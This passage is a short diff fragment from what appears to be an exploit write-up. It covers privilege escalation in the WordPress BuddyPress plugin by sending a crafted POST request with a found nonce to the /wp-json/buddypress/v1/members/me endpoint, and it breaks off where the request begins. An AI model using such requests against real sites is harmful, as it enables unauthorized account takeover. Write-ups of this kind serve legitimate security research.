@@ -200,6 +200,7 @@ X-WP-Nonce: 8af0f38b91
 Nice, we have found the nonce.
 
 If we now craft this request and send it to the vulnerable endpoint /wp-json/buddypress/v1/members/me we should be able to elevate our privs.
+
 **Request**
 ``` 
 POST /wp-json/buddypress/v1/members/me HTTP/1.1
